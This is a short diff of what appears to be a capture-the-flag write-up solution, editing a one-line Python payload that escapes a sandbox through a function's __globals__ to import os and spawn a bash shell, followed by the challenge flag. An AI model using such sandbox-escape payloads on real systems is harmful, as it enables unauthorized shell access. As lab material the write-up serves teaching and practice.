@@ -12,7 +12,7 @@ misc
 
 ### Solution
 
-`print(show.__globals__['__builtins__'].__import__("os").system("bash"))`
+`show.__globals__['__builtins__'].__import__("os").system("bash")`
 
 Flag: `Itemize{n1ss3ns_l1st3_9000}`
 
